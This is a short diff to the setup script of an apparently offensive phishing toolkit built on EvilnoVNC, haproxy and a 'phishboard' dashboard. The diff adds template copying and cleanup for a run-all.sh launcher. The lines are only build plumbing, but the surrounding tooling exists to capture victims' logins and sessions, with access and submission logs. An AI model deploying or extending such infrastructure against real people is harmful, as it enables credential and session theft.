@@ -47,6 +47,7 @@ cookieKey=$(mktemp -u | cut -d"." -f2)
 
 run="run.sh"
 erun="EvilnoVNC/run.sh"
+erunall="EvilnoVNC/run-all.sh"
 cfg="haproxy/haproxy.cfg"
 hrun="haproxy/run.sh"
 dash1="controller/src/phishboard/index.php"
@@ -66,6 +67,7 @@ if [ "$1" == "clean" ]; then
 	rm -f $hrun && echo $hrun
 	rm -f $dash1 && echo $dash1
 	rm -f $dash2 && echo $dash2
+	rm -f $erunall && echo $erunall
     rm -f $evil_vnc_html && echo $evil_vnc_html
 	rm -f accesslog.txt && echo "accesslog.txt"
 	rm -f submitlog.txt && echo "submitlog.txt"
@@ -107,9 +109,12 @@ sed -i "s/---inst---/$instances/" $run
 ## build EvilnoVNC run.sh from template
 cp EvilnoVNC/run-template.sh $erun
 cp EvilnoVNC/vnc_lite-template.html $evil_vnc_html
+cp EvilnoVNC/run-all-template.sh $erunall
 chmod +x $erun
+chmod +x $erunall
 sed -i "s#---tUrl---#$tUrl#" $erun
 sed -i "s,-----REDIRECTURL-----,$redirectURL,g" $evil_vnc_html
+sed -i "s/-----INSTANCENUM-----/$instances/g" $erunall
 
 ## build haproxy config from template
 cp haproxy/haproxy-template.cfg $cfg
